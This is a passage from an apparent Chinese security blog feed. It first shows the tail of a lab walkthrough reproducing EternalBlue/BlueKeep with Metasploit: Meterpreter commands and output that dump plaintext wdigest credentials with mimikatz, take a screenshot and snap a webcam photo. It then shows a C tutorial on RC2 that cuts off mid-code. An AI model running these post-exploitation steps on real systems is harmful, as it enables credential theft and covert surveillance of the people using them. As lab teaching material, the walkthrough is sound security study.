class="line">meterpreter &gt; load mimikatz</span><br><span class="line">Loading extension mimikatz...[!] Loaded Mimikatz on a newer OS (Windows 7 (Build 7601, Service Pack 1).). Did you mean to &apos;load kiwi&apos; instead?</span><br><span class="line">Success.</span><br><span class="line">meterpreter &gt; wdigest</span><br><span class="line">[+] Running as SYSTEM</span><br><span class="line">[*] Retrieving wdigest credentials</span><br><span class="line">wdigest credentials</span><br><span class="line">===================</span><br><span class="line"></span><br><span class="line">AuthID    Package    Domain           User              Password</span><br><span class="line">------    -------    ------           ----              --------</span><br><span class="line">0;997     Negotiate  NT AUTHORITY     LOCAL SERVICE</span><br><span class="line">0;996     Negotiate  WORKGROUP        WIN-Q1ST6EBNLTR$</span><br><span class="line">0;52252   NTLM</span><br><span class="line">0;999     NTLM       WORKGROUP        WIN-Q1ST6EBNLTR$</span><br><span class="line">0;333800  NTLM       WIN-Q1ST6EBNLTR  victim            admin123</span><br><span class="line">0;333754  NTLM       WIN-Q1ST6EBNLTR  victim            admin123</span><br></pre></td></tr></table></figure><h3 id="截取屏幕"><a href="#截取屏幕" class="headerlink" title="截取屏幕"></a>截取屏幕</h3><p>使用 screenshot 可以截取桌面实时图片：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; screenshot</span><br><span class="line">Screenshot saved to: /root/NjEXrhqY.jpeg</span><br></pre></td></tr></table></figure><p><img src="/pics/Have-Fun-with-Metasploit-Framework/2.png" alt="屏幕截图"></p><h3 id="用摄像头拍照"><a href="#用摄像头拍照" class="headerlink" title="用摄像头拍照"></a>用摄像头拍照</h3><p>使用 webcam 系列命令可以用摄像头拍照：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; webcam_list</span><br><span class="line">1: VMware Virtual USB Video Device</span><br><span class="line">meterpreter &gt; webcam_snap</span><br><span class="line">[*] Starting...</span><br><span class="line">[+] Got frame</span><br><span class="line">[*] Stopped</span><br><span class="line">Webcam shot saved to: /root/jkhYoacC.jpeg</span><br></pre></td></tr></table></figure><p><img src="/pics/Have-Fun-with-Metasploit-Framework/3.png" alt="摄像头拍照"></p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://blog.51cto.com/chenxinjie/2092754" target="_blank" rel="noopener">https://blog.51cto.com/chenxinjie/2092754</a><br><a href="https://mp.weixin.qq.com/s/swR4LjNJgHsx2VetyM6G5Q" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/swR4LjNJgHsx2VetyM6G5Q</a><br><a href="https://www.anquanke.com/post/id/164525" target="_blank" rel="noopener">https://www.anquanke.com/post/id/164525</a><br><a href="https://zhuanlan.zhihu.com/p/25857679" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/25857679</a><br><a href="https://xz.aliyun.com/t/2536" target="_blank" rel="noopener">https://xz.aliyun.com/t/2536</a><br><a href="http://hardsec.net/mimikatz-meterpreter-extension/?lang=en" target="_blank" rel="noopener">http://hardsec.net/mimikatz-meterpreter-extension/?lang=en</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;使用 Metasploit-Framework 复现 EternalBlue 以及 BlueKeep。&lt;/p&gt;
    
    </summary>
    
    
      <category term="cve" scheme="https://qianfei11.github.io/tags/cve/"/>
    
      <category term="kali" scheme="https://qianfei11.github.io/tags/kali/"/>
    
  </entry>
  
  <entry>
    <title>C语言实现RC2、RC5、RC6加密解密算法</title>
    <link href="https://qianfei11.github.io/2019/09/03/C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0RC2%E3%80%81RC5%E3%80%81RC6%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95/"/>
    <id>https://qianfei11.github.io/2019/09/03/C语言实现RC2、RC5、RC6加密解密算法/</id>
    <published>2019-09-03T05:38:28.000Z</published>
    <updated>2019-09-06T09:17:29.717Z</updated>
    
    <content type="html"><![CDATA[<p>RC 算法是由 Ron Rivest 发明的一系列对称密钥加密算法。虽然这一系列的算法名字相似，但实际上算法之间没有太大的关联。</p><a id="more"></a><h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p>现在总共有六个 RC 系列的算法。其中 RC1 从来没有发布过，RC3 在开始使用前就被证明是不安全的。余下的都是现如今有所运用的算法。</p><ol><li>RC2 是一个于 1987 年发布的 64 位分组加密算法。</li><li>RC4 是当今运用最广泛的序列密码。我在<a href="https://qianfei11.github.io/2018/05/13/C%E8%AF%AD%E8%A8%80%E5%AE%9E%E7%8E%B0RC4%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E7%AE%97%E6%B3%95/">之前的文章</a>中实现过。</li><li>RC5 是一个于 1994 年发布的 32/64/128 位分组加密算法。</li><li>RC6 是一个于 1997 年发布的基于 RC5 的 128 位分组加密算法，在当年 AES 的评选中曾是 AES 决赛算法。</li></ol><p>了解过算法的基本知识后，下面是 RC2、RC5 以及 RC6 在 C 语言下的实现。</p><h1 id="RC2"><a href="#RC2" class="headerlink" title="RC2"></a><a href="https://en.wikipedia.org/wiki/RC2" target="_blank" rel="noopener">RC2</a></h1><p>RC2 是一种分组密码，和 DES 很像，它的输入和输出的长度都是 64 位，而密钥是可变的，长度范围是从 1 到 128 比特，目前使用的是 8 比特的密钥。RC2 被设计成能够在 16 位处理器上运行。在 IBM AT 上它能够比 DES 的加密速度快一倍（假设在完成密钥扩展的情况下）。</p><p>RC2 总共分为三个算法步骤。分别是密钥扩展、加密、解密。</p><p><img src="/pics/C语言实现RC2、RC5、RC6加密解密算法/rc2.png" alt="RC2 加密算法"></p><h2 id="密钥扩展算法"><a href="#密钥扩展算法" class="headerlink" title="密钥扩展算法"></a>密钥扩展算法</h2><p>密钥扩展通过一个长度变化的密钥生成 64 个字数组。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc2_keygen</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">short</span> xkey[<span class="number">64</span>], <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *key, <span class="keyword">unsigned</span> len, <span class="keyword">unsigned</span> bits)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> x;</span><br><span class="line">    <span class="keyword">unsigned</span> i;</span><br><span class="line">    <span class="comment">/* 256-entry permutation table, probably derived somehow from pi */</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> PITABLE[<span class="number">256</span>] = &#123;<span class="number">0xD9</span>, <span class="number">0x78</span>, <span class="number">0xF9</span>, <span class="number">0xC4</span>, <span class="number">0x19</span>, <span class="number">0xDD</span>, <span class="number">0xB5</span>, <span class="number">0xED</span>, <span class="number">0x28</span>, <span class="number">0xE9</span>, <span class="number">0xFD</span>, <span class="number">0x79</span>, <span class="number">0x4A</span>, <span class="number">0xA0</span>, <span class="number">0xD8</span>, <span class="number">0x9D</span>, <span class="number">0xC6</span>, <span class="number">0x7E</span>, <span class="number">0x37</span>, <span class="number">0x83</span>, <span class="number">0x2B</span>, <span class="number">0x76</span>, <span class="number">0x53</span>, <span class="number">0x8E</span>, <span class="number">0x62</span>, <span class="number">0x4C</span>, <span class="number">0x64</span>, <span class="number">0x88</span>, <span class="number">0x44</span>, <span class="number">0x8B</span>, <span class="number">0xFB</span>, <span class="number">0xA2</span>, <span class="number">0x17</span>, <span class="number">0x9A</span>, <span class="number">0x59</span>, <span class="number">0xF5</span>, <span class="number">0x87</span>, <span class="number">0xB3</span>, <span class="number">0x4F</span>, <span class="number">0x13</span>, <span class="number">0x61</span>, <span class="number">0x45</span>, <span class="number">0x6D</span>, <span class="number">0x8D</span>, <span class="number">0x09</span>, <span class="number">0x81</span>, <span class="number">0x7D</span>, <span class="number">0x32</span>, <span class="number">0xBD</span>, <span class="number">0x8F</span>, <span class="number">0x40</span>, <span class="number">0xEB</span>, <span class="number">0x86</span>, <span class="number">0xB7</span>, <span class="number">0x7B</span>, <span class="number">0x0B</span>, <span class="number">0xF0</span>, <span class="number">0x95</span>, <span class="number">0x21</span>, <span class="number">0x22</span>, <span class="number">0x5C</span>, <span class="number">0x6B</span>, <span class="number">0x4E</span>, <span class="number">0x82</span>, <span class="number">0x54</span>, <span class="number">0xD6</span>, <span class="number">0x65</span>, <span class="number">0x93</span>, <span class="number">0xCE</span>, <span class="number">0x60</span>, <span class="number">0xB2</span>, <span class="number">0x1C</span>, <span class="number">0x73</span>, <span class="number">0x56</span>, <span class="number">0xC0</span>, <span class="number">0x14</span>, <span class="number">0xA7</span>, <span class="number">0x8C</span>, <span class="number">0xF1</span>, <span class="number">0xDC</span>, <span class="number">0x12</span>, <span class="number">0x75</span>, <span class="number">0xCA</span>, <span class="number">0x1F</span>, <span class="number">0x3B</span>, <span class="number">0xBE</span>, <span class="number">0xE4</span>, <span class="number">0xD1</span>, <span class="number">0x42</span>, <span class="number">0x3D</span>, <span class="number">0xD4</span>, <span class="number">0x30</span>, <span class="number">0xA3</span>, <span class="number">0x3C</span>, <span class="number">0xB6</span>, <span class="number">0x26</span>, <span class="number">0x6F</span>, <span class="number">0xBF</span>, <span class="number">0x0E</span>, <span class="number">0xDA</span>, <span class="number">0x46</span>, <span class="number">0x69</span>, <span class="number">0x07</span>, <span class="number">0x57</span>, <span class="number">0x27</span>, <span class="number">0xF2</span>, <span class="number">0x1D</span>, <span class="number">0x9B</span>, <span class="number">0xBC</span>, <span class="number">0x94</span>, <span class="number">0x43</span>, <span class="number">0x03</span>, <span class="number">0xF8</span>, <span class="number">0x11</span>, <span class="number">0xC7</span>, <span class="number">0xF6</span>, <span class="number">0x90</span>, <span class="number">0xEF</span>, <span class="number">0x3E</span>, <span class="number">0xE7</span>, <span class="number">0x06</span>, <span class="number">0xC3</span>, <span class="number">0xD5</span>, <span class="number">0x2F</span>, <span class="number">0xC8</span>, <span class="number">0x66</span>, <span class="number">0x1E</span>, <span class="number">0xD7</span>, <span class="number">0x08</span>, <span class="number">0xE8</span>, <span class="number">0xEA</span>, <span class="number">0xDE</span>, <span class="number">0x80</span>, <span class="number">0x52</span>, <span class="number">0xEE</span>, <span class="number">0xF7</span>, <span class="number">0x84</span>, <span class="number">0xAA</span>, <span class="number">0x72</span>, <span class="number">0xAC</span>, <span class="number">0x35</span>, <span class="number">0x4D</span>, <span class="number">0x6A</span>, <span class="number">0x2A</span>, <span class="number">0x96</span>, <span class="number">0x1A</span>, <span class="number">0xD2</span>, <span class="number">0x71</span>, <span class="number">0x5A</span>, <span class="number">0x15</span>, <span class="number">0x49</span>, <span class="number">0x74</span>, <span class="number">0x4B</span>, <span class="number">0x9F</span>, <span class="number">0xD0</span>, <span class="number">0x5E</span>, <span class="number">0x04</span>, <span class="number">0x18</span>, <span class="number">0xA4</span>, <span class="number">0xEC</span>, <span class="number">0xC2</span>, <span class="number">0xE0</span>, <span class="number">0x41</span>, <span class="number">0x6E</span>, <span class="number">0x0F</span>, <span class="number">0x51</span>, <span class="number">0xCB</span>, <span class="number">0xCC</span>, <span class="number">0x24</span>, <span class="number">0x91</span>, <span class="number">0xAF</span>, <span class="number">0x50</span>, <span class="number">0xA1</span>, <span class="number">0xF4</span>, <span class="number">0x70</span>, <span class="number">0x39</span>, <span class="number">0x99</span>, <span class="number">0x7C</span>, <span class="number">0x3A</span>, <span class="number">0x85</span>, <span class="number">0x23</span>, <span class="number">0xB8</span>, <span class="number">0xB4</span>, <span class="number">0x7A</span>, <span class="number">0xFC</span>, <span class="number">0x02</span>, <span class="number">0x36</span>, <span class="number">0x5B</span>, <span class="number">0x25</span>, <span class="number">0x55</span>, <span class="number">0x97</span>, <span class="number">0x31</span>, <span class="number">0x2D</span>, <span class="number">0x5D</span>, <span class="number">0xFA</span>, <span class="number">0x98</span>, <span class="number">0xE3</span>, <span class="number">0x8A</span>, <span class="number">0x92</span>, <span class="number">0xAE</span>, <span class="number">0x05</span>, <span class="number">0xDF</span>, <span class="number">0x29</span>, <span class="number">0x10</span>, <span class="number">0x67</span>, <span class="number">0x6C</span>, <span class="number">0xBA</span>, <span class="number">0xC9</span>, <span class="number">0xD3</span>, <span class="number">0x00</span>, <span class="number">0xE6</span>, <span class="number">0xCF</span>, <span class="number">0xE1</span>, <span class="number">0x9E</span>, <span class="number">0xA8</span>, <span class="number">0x2C</span>, <span class="number">0x63</span>, <span class="number">0x16</span>, <span class="number">0x01</span>, <span class="number">0x3F</span>, <span class="number">0x58</span>, <span class="number">0xE2</span>, <span class="number">0x89</span>, <span class="number">0xA9</span>, <span class="number">0x0D</span>, <span class="number">0x38</span>, <span class="number">0x34</span>, <span class="number">0x1B</span>, <span class="number">0xAB</span>, <span class="number">0x33</span>, <span class="number">0xFF</span>, <span class="number">0xB0</span>, <span class="number">0xBB</span>, <span class="number">0x48</span>, <span class="number">0x0C</span>, <span class="number">0x5F</span>, <span class="number">0xB9</span>, <span class="number">0xB1</span>, <span class="number">0xCD</span>, <span class="number">0x2E</span>, <span class="number">0xC5</span>, <span class="number">0xF3</span>, <span class="number">0xDB</span>, <span class="number">0x47</span>, <span class="number">0xE5</span>, <span class="number">0xA5</span>, <span class="number">0x9C</span>, <span class="number">0x77</span>, <span class="number">0x0A</span>, <span class="number">0xA6</span>, <span class="number">0x20</span>, <span class="number">0x68</span>, <span class="number">0xFE</span>, <span class="number">0x7F</span>, <span class="number">0xC1</span>, <span class="number">0xAD</span>&#125;;</span><br><span class="line"></span><br><span class="line">    assert(len &gt; <span class="number">0</span> &amp;&amp; len &lt;= <span class="number">128</span>);</span><br><span class="line">    assert(bits &lt;= <span class="number">1024</span>);</span><br><span class="line">    <span class="keyword">if</span> (!bits)</span><br><span class="line">        bits = <span class="number">1024</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(xkey, key, len);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Phase 1: Expand input key to 128 bytes */</span></span><br><span class="line">    <span class="comment">// for i = T, T+1, ..., 127 do</span></span><br><span class="line">    <span class="comment">//     L[i] = PITABLE[L[i-1] + L[i-T]];</span></span><br><span class="line">    <span class="keyword">if</span> (len &lt; <span class="number">128</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        i = <span class="number">0</span>;</span><br><span class="line">        x = ((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)xkey)[len - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            x = PITABLE[(x + ((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)xkey)[i++]) &amp; <span class="number">255</span>];</span><br><span class="line">            ((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)xkey)[len++] = x;</span><br><span class="line">        &#125; <span class="keyword">while</span> (len &lt; <span class="number">128</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Phase 2 - reduce effective key size to "bits" */</span></span><br><span class="line">    <span class="comment">// L[128-T8] = PITABLE[L[128-T8] &amp; TM];</span></span><br><span class="line">    len = (bits + <span class="number">7</span>) &gt;&gt; <span class="number">3</span>; <span class="comment">// bits = T1, len = T8, T8 = (T1+7)/8;</span></span><br><span class="line">    i = <span class="number">128</span> - len;</span><br><span class="line">    x = PITABLE[((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)xkey)[i] &amp; (<span class="number">255</span> &gt;&gt; (<span class="number">7</span> &amp; -bits))]; <span class="comment">// (255 &gt;&gt; (7 &amp; -bits) = TM, TM = 255 MOD 2^(8 + T1 - 8*T8);</span></span><br><span class="line">    ((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)xkey)[i] = x;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// for i = 127-T8, ..., 0 do</span></span><br><span class="line">    <span class="comment">//     L[i] = PITABLE[L[i+1] XOR L[i+T8]];</span></span><br><span class="line">    <span class="keyword">while</span> (i--)</span><br><span class="line">    &#123;</span><br><span class="line">        x = PITABLE[x ^ ((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)xkey)[i + len]];</span><br><span class="line">        ((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)xkey)[i] = x;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Phase 3 - copy to xkey in little-endian order */</span></span><br><span class="line">    i = <span class="number">63</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        xkey[i] = ((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)xkey)[<span class="number">2</span> * i] +</span><br><span class="line">                  (((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)xkey)[<span class="number">2</span> * i + <span class="number">1</span>] &lt;&lt; <span class="number">8</span>);</span><br><span class="line">    &#125; <span class="keyword">while</span> (i--);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="加密算法"><a href="#加密算法" class="headerlink" title="加密算法"></a>加密算法</h2><p>加密操作将一组 64 比特的字存入 4 个字中再进行加密。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc2_encrypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">short</span> xkey[<span class="number">64</span>], <span class="keyword">unsigned</span> <span class="keyword">char</span> *plain, <span class="keyword">unsigned</span> <span class="keyword">char</span> *cipher)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// xkey = K, plain = R</span></span><br><span class="line">    <span class="keyword">unsigned</span> x76, x54, x32, x10, i;</span><br><span class="line"></span><br><span class="line">    x76 = (plain[<span class="number">7</span>] &lt;&lt; <span class="number">8</span>) + plain[<span class="number">6</span>];</span><br><span class="line">    x54 = (plain[<span class="number">5</span>] &lt;&lt; <span class="number">8</span>) + plain[<span class="number">4</span>];</span><br><span class="line">    x32 = (plain[<span class="number">3</span>] &lt;&lt; <span class="number">8</span>) + plain[<span class="number">2</span>];</span><br><span class="line">    x10 = (plain[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>) + plain[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// R[i] = R[i] + K[j] + (R[i-1] &amp; R[i-2]) + ((~R[i-1]) &amp; R[i-3]);</span></span><br><span class="line">        <span class="comment">// j = j + 1;</span></span><br><span class="line">        <span class="comment">// R[i] = R[i] rol s[i];</span></span><br><span class="line">        x10 += (x32 &amp; ~x76) + (x54 &amp; x76) + xkey[<span class="number">4</span> * i + <span class="number">0</span>];</span><br><span class="line">        x10 = (x10 &lt;&lt; <span class="number">1</span>) + (x10 &gt;&gt; <span class="number">15</span> &amp; <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        x32 += (x54 &amp; ~x10) + (x76 &amp; x10) + xkey[<span class="number">4</span> * i + <span class="number">1</span>];</span><br><span class="line">        x32 = (x32 &lt;&lt; <span class="number">2</span>) + (x32 &gt;&gt; <span class="number">14</span> &amp; <span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">        x54 += (x76 &amp; ~x32) + (x10 &amp; x32) + xkey[<span class="number">4</span> * i + <span class="number">2</span>];</span><br><span class="line">        x54 = (x54 &lt;&lt; <span class="number">3</span>) + (x54 &gt;&gt; <span class="number">13</span> &amp; <span class="number">7</span>);</span><br><span class="line"></span><br><span class="line">        x76 += (x10 &amp; ~x54) + (x32 &amp; x54) + xkey[<span class="number">4</span> * i + <span class="number">3</span>];</span><br><span class="line">        x76 = (x76 &lt;&lt; <span class="number">5</span>) + (x76 &gt;&gt; <span class="number">11</span> &amp; <span class="number">31</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// R[i] = R[i] + K[R[i-1] &amp; 63];</span></span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">4</span> || i == <span class="number">10</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            x10 += xkey[x76 &amp; <span class="number">63</span>];</span><br><span class="line">            x32 += xkey[x10 &amp; <span class="number">63</span>];</span><br><span class="line">            x54 += xkey[x32 &amp; <span class="number">63</span>];</span><br><span class="line">            x76 += xkey[x54 &amp; <span class="number">63</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cipher[<span class="number">0</span>] = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)x10;</span><br><span class="line">    cipher[<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)(x10 &gt;&gt; <span class="number">8</span>);</span><br><span class="line">    cipher[<span class="number">2</span>] = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)x32;</span><br><span class="line">    cipher[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)(x32 &gt;&gt; <span class="number">8</span>);</span><br><span class="line">    cipher[<span class="number">4</span>] = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)x54;</span><br><span class="line">    cipher[<span class="number">5</span>] = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)(x54 &gt;&gt; <span class="number">8</span>);</span><br><span class="line">    cipher[<span class="number">6</span>] = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)x76;</span><br><span class="line">    cipher[<span class="number">7</span>] = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)(x76 &gt;&gt; <span class="number">8</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解密算法"><a href="#解密算法" class="headerlink" title="解密算法"></a>解密算法</h2><p>解密操作即为加密操作的逆运算。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rc2_decrypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">short</span> xkey[<span class="number">64</span>], <span class="keyword">unsigned</span> <span class="keyword">char</span> *plain, <span class="keyword">unsigned</span> <span class="keyword">char</span> *cipher)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> x76, x54, x32, x10, i;</span><br><span class="line"></span><br><span class="line">    x76 = (cipher[<span class="number">7</span>] &lt;&lt; <span class="number">8</span>) + cipher[<span class="number">6</span>];</span><br><span class="line">    x54 = (cipher[<span class="number">5</span>] &lt;&lt; <span class="number">8</span>) + cipher[<span class="number">4</span>];</span><br><span class="line">    x32 = (cipher[<span class="number">3</span>] &lt;&lt; <span class="number">8</span>) + cipher[<span class="number">2</span>];</span><br><span class="line">    x10 = (cipher[<span class="number">1</span>] &lt;&lt; <span class="number">8</span>) + cipher[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    i = <span class="number">15</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// R[i] = R[i] ror s[i];</span></span><br><span class="line">        <span class="comment">// R[i] = R[i] - K[j] - (R[i-1] &amp; R[i-2]) - ((~R[i-1]) &amp; R[i-3]);</span></span><br><span class="line">        <span class="comment">// j = j - 1;</span></span><br><span class="line">        x76 &amp;= <span class="number">65535</span>;</span><br><span class="line">        x76 = (x76 &lt;&lt; <span class="number">11</span>) + (x76 &gt;&gt; <span class="number">5</span>);</span><br><span class="line">        x76 -= (x10 &amp; ~x54) + (x32 &amp; x54) + xkey[<span class="number">4</span> * i + <span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">        x54 &amp;= <span class="number">65535</span>;</span><br><span class="line">        x54 = (x54 &lt;&lt; <span class="number">13</span>) + (x54 &gt;&gt; <span class="number">3</span>);</span><br><span class="line">        x54 -= (x76 &amp; ~x32) + (x10 &amp; x32) + xkey[<span class="number">4</span> * i + <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">        x32 &amp;= <span class="number">65535</span>;</span><br><span class="line">        x32 = (x32 &lt;&lt; <span class="number">14</span>) + (x32 &gt;&gt; <span class="number">2</span>);</span><br><span class="line">        x32 -= (x54 &amp; ~x10) + (x76 &amp; x10) + xkey[<span class="number">4</span> * i + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">        x10 &amp;= <span class="number">65535</span>;</span><br><span class="line">        x10 = (x10 &lt;&lt; <span class="number">15</span>) + (x10 &gt;&gt; <span class="number">1</span>);</span><br><span class="line">        x10 -= (x32 &amp; ~x76) + (x54 &amp; x76) + xkey[<span class="number">4</span> * i + <span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// R[i] = R[i] - K[R[i-1] &amp; 63];</span></span><br><span class="line">        <span class="keyword">if</span> (i == <span class="number">5</span> || i == <span class="number">11</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            x76 -= xkey[x54 &amp; <span class="number">63</span>];</span><br><span class="line">            x54 -= xkey[x32 &amp; <span class="number">63</span>];</span><br><span class="line">            x32 -= xkey[x10 &amp; <span class="number">63</span>];</span><br><span class="line">            x10 -= xkey[x76 &amp; <span class="number">63</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (i--);</span><br><span class="line"></span><br><span class="line">    plain[<span class="number">0</span>] = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)x10;</span><br><span class="line">    plain[<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)(x10 &gt;&gt; <span class="number">8</span>);</span><br><span class="line">    plain[<span class="number">2</span>] = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)x32;</span><br><span class="line">    plain[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)(x32 &gt;&gt; <span class="number">8</span>);</span><br><span class="line">    plain[<span class="number">4</span>] = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)x54;</span><br><span class="line">    plain[<span class="number">5</span>] = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)(x54 &gt;&gt; <span class="number">8</span>);</span><br><span class="line">    plain[<span class="number">6</span>] = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)x76;</span><br><span class="line">    plain[<span class="number">7</span>] = (<span class="keyword">unsigned</span> <span 